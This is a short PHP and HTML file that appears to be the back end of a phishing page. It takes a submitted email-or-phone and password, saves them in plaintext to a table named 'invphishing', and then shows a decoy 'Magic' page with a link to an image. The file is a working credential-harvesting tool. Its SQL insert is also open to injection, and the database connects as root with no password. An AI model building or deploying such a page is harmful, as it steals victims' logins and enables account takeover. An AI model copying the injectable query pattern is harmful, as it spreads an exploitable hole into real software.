<?php
   

    // connect to the database

    $con = mysqli_connect('localhost','root');
    
    mysqli_select_db($con, 'l_form');

    // if the register button is clicked

    
    $email = $_POST['uname'];
    $password = $_POST['upass'];
  
    //echo "data is taken";

    // if there are no errors, save user to database

    $q = "INSERT INTO invphishing (emailorph, password) VALUES ('$email', '$password')";
    $i = mysqli_query($con, $q);
    
    mysqli_close($con);
    
   

    ?>


<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Magic</title>
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
	<style>
		#down-arrow{
			font-size: 20rem;
			color: #B84E91;
			position: relative;
			left: 30%;
		}
		
	</style>
</head>
<body>
	<div class="container">
		<i class="fa fa-long-arrow-down" id="down-arrow" aria-hidden="true"></i>
		
		

	</div>
	<div class="container">
		<a class="btn btn-info btn-block" href="dpp.png">Click Here to See Magic</a>
	</div>

</body>
</html>


<!-- email pass-->